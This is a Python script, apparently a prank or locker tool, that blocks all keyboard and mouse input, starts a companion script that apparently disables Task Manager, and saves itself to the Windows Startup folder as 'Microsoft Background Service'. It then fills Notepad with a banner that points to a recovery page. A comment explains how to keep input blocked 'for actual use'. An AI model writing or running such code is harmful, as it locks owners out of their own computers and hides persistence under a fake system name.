import threading
import pyautogui
import time
import keyboard
from pynput.mouse import Controller
import subprocess

# Starting the noTaskMgr script
ntm = subprocess.Popen(["Documents\\Scripts\\python.exe", "noTaskMgr.py"])


#  definitions
def blockinput():
    global block_input_flag
    block_input_flag = 1
    t1 = threading.Thread(target=blockinput_start)
    t1.start()


def unblockinput():
    blockinput_stop()


def blockinput_start():
    mouse = Controller()
    global block_input_flag
    pyautogui.FAILSAFE = False
    for i in range(0, 150):
        keyboard.block_key(i)
    while block_input_flag == 1:
        mouse.position = (0, 0)


def blockinput_stop():
    global block_input_flag
    for i in range(0, 150):
        keyboard.unblock_key(i)
    block_input_flag = 0


blockinput()
pyautogui.keyDown('win')
pyautogui.press('r')
pyautogui.keyUp('win')
pyautogui.write('shell:startup')
pyautogui.press('enter')
time.sleep(0.5)
currentWindow = pyautogui.getActiveWindow()
currentWindow.maximize()
pyautogui.press('f10')
time.sleep(0.25)
pyautogui.press('h')
time.sleep(0.25)
pyautogui.press('w')
time.sleep(0.25)
pyautogui.press('s')
time.sleep(0.5)
pyautogui.write(str(__file__))
pyautogui.press('enter')
time.sleep(0.25)
pyautogui.write('Microsoft Background Service')
pyautogui.press('enter')
time.sleep(0.1)
pyautogui.press('enter')
time.sleep(0.1)
currentWindow = pyautogui.getActiveWindow()
currentWindow.close()

time.sleep(0.25)

pyautogui.keyDown('win')
pyautogui.press('r')
pyautogui.keyUp('win')
time.sleep(0.25)
pyautogui.write('cmd')
pyautogui.press('enter')
time.sleep(0.25)
currentWindow = pyautogui.getActiveWindow()
currentWindow.maximize()
pyautogui.write('C:\\WINDOWS\\system32\\notepad.exe')
pyautogui.press('enter')
time.sleep(0.25)
pyautogui.keyDown('alt')
pyautogui.press('tab')
pyautogui.keyUp('alt')
time.sleep(0.2)
pyautogui.write('exit')
pyautogui.press('enter')
time.sleep(0.2)

notepad = pyautogui.getActiveWindow()
notepad.maximize()
pyautogui.write(
    r' ________   ___   ________   ___  ___   ________   ___        ________   ________    _______       ' + '\n' +
    r'|\   ____\ |\  \ |\   ____\ |\  \|\  \ |\   ____\ |\  \      |\   __  \ |\   ___  \ |\  ___ \      ' + '\n' +
    r'\ \  \___|_\ \  \\ \  \___| \ \  \\\  \\ \  \___| \ \  \     \ \  \|\  \\ \  \\ \  \\ \   __/|     ' + '\n' +
    r' \ \_____  \\ \  \\ \  \ ____\ \   __  \\ \  \     \ \  \     \ \  \\\  \\ \  \\ \  \\ \  \_|/__   ' + '\n' +
    r'  \|____|\  \\ \  \\ \  \|_|\\\ \  \ \  \\ \  \____ \ \  \____ \ \  \\\  \\ \  \\ \  \\ \  \_|\ \  ' + '\n' +
    r'    ____\_\  \\ \__\\ \_______\\ \__\ \__\\ \_______\\ \_______\\ \_______\\ \__\\ \__\\ \_______\ ' + '\n' +
    r'   |\_________\\|__| \|_______| \|__|\|__| \|_______| \|_______| \|_______| \|__| \|__| \|_______| ' + '\n' +
    r'   \|_________|                                                                                    ' + '\n' +
    r'---------------------------------------------------------------------------------------------------' + '\n' +
    r'For the recovery of your device,' + '\nplease visit https://github.com/sighclone/TextInNotepad/wiki/Recovery'
)
# Comment the following line of code for actual use, this will ensure that the keyboard and mouse inputs remain blocked
time.sleep(5)
unblockinput()
x = 0

'''
while True:
    try:
        currentWindow = pyautogui.getActiveWindow()
        title = currentWindow.title
        if title == 'Notepad':
            pyautogui.press(['right', 'right', 'enter'])
            x = 0
        elif title == '*Untitled - Notepad':
            x = 0
        elif title != '*Untitled - Notepad':
            x += 1
            for i in range(0, x):
                pyautogui.keyDown('alt')
                pyautogui.press('tab')
                pyautogui.keyUp('alt')
    except:
        pyautogui.keyDown('alt')
        pyautogui.press('tab')
        pyautogui.keyUp('alt')
'''